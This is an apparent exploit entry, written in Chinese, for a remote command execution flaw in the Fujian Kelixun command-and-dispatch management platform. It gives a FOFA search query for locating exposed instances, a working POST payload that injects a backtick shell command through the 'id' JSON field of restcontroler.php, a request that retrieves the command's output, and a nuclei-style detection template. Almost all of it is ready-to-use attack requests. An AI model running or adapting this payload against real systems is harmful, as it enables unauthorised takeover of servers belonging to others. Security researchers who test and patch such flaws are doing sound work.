# 福建科立讯通信指挥调度管理平台restcontroler存在RCE漏洞

- **系统**：福建科立讯通信指挥调度管理平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app=指挥调度管理平台`
- **请求**：`POST /restapi/restcontroler.php?request=conference/mute\_member HTTP/1.1`
- **关键头**：`id: zhihuidiaodu-restapi-restcontroler-rce`　`name: 指挥调度管理平台restcontroler.php RCE`　`author: unknow`　`severity: critical`　`tags: zhihuidiaodu, rce`　`fofa-query: app="指挥调度管理平台"`　`verified: true`　`max-request: 2`

**请求体 / payload**
```
执行id命令写入txt
Host:
Content-Length: 63
{"members":"all","id":"`id > test123.txt`"}
得到结果
GET /restapi/test123.txt HTTP/1.1
Host:
Cookie: PHPSESSID=0207599ad5f9d5b3ac76396ffa8909bc
- raw:
-
Host: {{Hostname}}
{"members":"all","id":"`id > {{randstr}}.txt`"}
-
GET /restapi/{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}
req-condition: true
matchers-condition: and
matchers:
- type: dsl
dsl:
- "status\_code\_1==200"
- "status\_code\_2==200"
- "contains(body\_1, 'success')"
- "contains(body\_2, 'uid=')"
condition: and
```
- **预期**：200　|　—